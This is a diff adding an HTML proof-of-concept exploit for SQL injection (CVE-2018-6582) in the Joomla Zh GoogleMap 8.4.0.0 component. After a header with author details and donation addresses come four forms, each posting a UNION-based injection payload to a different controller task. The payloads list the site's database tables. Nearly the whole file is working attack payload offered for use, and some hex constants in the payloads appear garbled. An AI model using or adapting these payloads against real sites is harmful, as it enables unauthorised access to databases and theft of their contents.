@@ -1,0 +1,61 @@
+<!--
+# # # # #
+# Exploit Title: Joomla! Component Zh GoogleMap 8.4.0.0 - SQL Injection
+# Dork: N/A
+# Date: 04.02.2018
+# Vendor Homepage: http://zhuk.cc/
+# Software Link: https://extensions.joomla.org/extensions/extension/maps-a-weather/maps-a-locations/zh-googlemap/
+# Software Download: http://zhuk.cc/files/pkg_zhgooglemap-j30-8.4.0.0-final.zip
+# Version: 8.4.0.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-6582
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# Want To Donate ?
+# BTC : 1NGEp2eNWRCE6gp2i31UPN6G6KBzMDdCyZ
+# ETH : 0xd606c6b86a1b88c7fcc1f58f7659cfd968449cf2
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# # # # #
+-->
+<html>
+<body>
+<!--com_zhgooglemap/controller.php-->
+
+<!--# 1)-->
+<!--L 30: public function getPlacemarkDetails() {........}-->
+<form action="http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPlacemarkDetails" method="post">
+<input name="id" value="-11 UNION ALL SELECT 11,11,11,11,11,11,11,11,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11--" type="hidden">
+<input type="submit" value="1-Ver Ayari">
+</form>
+
+<!--# 2)-->
+<!--L 363: public function getPlacemarkHoverText() {........}-->
+<form action="http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPlacemarkHoverText" method="post">
+<input name="id" value="-22 UNION ALL SELECT 22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22--" type="hidden">
+<input type="submit" value="2-Ver Ayari">
+</form>
+
+<!--# 3)-->
+<!--L 418: public function getPathHoverText() {........}-->
+<form action="http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPathHoverText" method="post">
+<input name="id" value="-33 UNION ALL SELECT 33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e336f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33--" type="hidden">
+<input type="submit" value="3-Ver Ayari">
+</form>
+
+<!--# 4)-->
+<!--L 763: public function getPathDetails() {........}-->
+<form action="http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPathDetails" method="post">
+<input name="id" value="-44 UNION ALL SELECT 44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44--" type="hidden">
+<input type="submit" value="4-Ver Ayari">
+</form>
+
+</body>
+</html>
